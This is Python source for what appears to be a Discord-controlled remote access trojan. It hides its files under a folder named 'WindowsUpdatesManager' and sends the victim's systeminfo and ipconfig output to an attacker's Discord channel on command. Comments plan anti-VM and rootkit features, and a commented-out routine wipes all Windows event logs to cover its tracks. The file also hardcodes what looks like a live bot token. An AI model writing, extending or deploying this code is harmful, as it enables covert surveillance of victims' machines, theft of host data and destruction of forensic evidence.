import os, json, discord, time, threading, subprocess
import modules.pc as pc

#IDEAS:
#   Anti VM (low priority)
#   Rootkit (med-high pr)



class Variables:
    def __init__(self):
        #t = os.getenv("TOKEN").split("MMM")
        #self.token = t[0]
        self.snky_dir = f"{os.getenv('LOCALAPPDATA')}\\WindowsUpdatesManager"

        if os.path.exists(f"{self.snky_dir}\\cfg.json"):
            with open(f"{self.snky_dir}\\cfg.json", "r") as f:
                self.cfg = json.load(f)
        else:
            self.cfg = {
                "prefix": "!"
            }

            with open(f"{self.snky_dir}\\cfg.json", "w") as f:
                json.dump(self.cfg, f, indent=4)

#Requires admin privileges :(

#def clear_logs():
#    while True: 
#        #os.popen("wevtutil el | ForEach-Object {wevtutil cl \"$_\"}")
#       si = subprocess.STARTUPINFO()
#       si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
#       subprocess.Popen("wevtutil el | ForEach-Object {wevtutil cl \"$_\"}", shell=False, startupinfo=si) #Nope
#       time.sleep(1)

intents = discord.Intents.all()
variables = Variables()

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print("")

@client.event
async def on_message(message):
    if message.author.bot:
        return

    #HELP MESSAGE
    if message.content.startswith(f"{variables.cfg['prefix']}help"):
        embed = discord.Embed(title="Help", color=0x00ff00)
        embed.add_field(name="!help", value="Shows this message", inline=False)

        await message.channel.send(embed=embed)

    #HOSTINFO - systeminfo cmd
    if message.content.startswith(f"{variables.cfg['prefix']}hostinfo"):
        embed = discord.Embed(title="Host Info", description="Host information gathered.", color=0x00ff00)

        result = pc.hostinfo(variables.snky_dir)

        while not os.path.exists(f"{variables.snky_dir}\\hostinfo.txt"):
            time.sleep(2)

        try:
            await message.channel.send(embed=embed, file=discord.File(result))
            time.sleep(0.3)
            os.remove(f"{variables.snky_dir}\\hostinfo.txt")
        except:
            pass

    #IPCONFIG - ipconfig cmd
    if message.content.startswith(f"{variables.cfg['prefix']}ipconfig"):
        embed = discord.Embed(title="IP Config", description="IP Configuration gathered.", color=0x00ff00)

        result = pc.ipconfig(variables.snky_dir)

        while not os.path.exists(f"{variables.snky_dir}\\ipconfig.txt"):
            time.sleep(2)

        try:
            await message.channel.send(embed=embed, file=discord.File(result))
            time.sleep(0.3)
            os.remove(f"{variables.snky_dir}\\ipconfig.txt")
        except:
            pass

#client.run(variables.token)
client.run("MTIyNTc5MTM4NjM2NDgwOTI1Ng.GgyZrr.lfp7eiYfTFxlNA4KIWTuR4vgCyJEgapPpA97Yc")
